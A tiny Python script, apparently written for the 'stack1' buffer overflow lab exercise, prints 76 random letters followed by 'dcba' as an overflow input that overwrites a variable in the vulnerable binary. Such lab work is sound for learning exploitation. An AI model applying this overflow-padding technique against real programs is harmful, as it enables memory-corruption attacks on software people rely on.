import random
import string

key = ""
#print("A"*76 + "abcd")

# Returns an exploit key.
# ./stack1 $(python3 keygen_stack.py)

for i in range(76):
    key = key + random.choice(string.ascii_letters)

key = key + "dcba"

print(key)
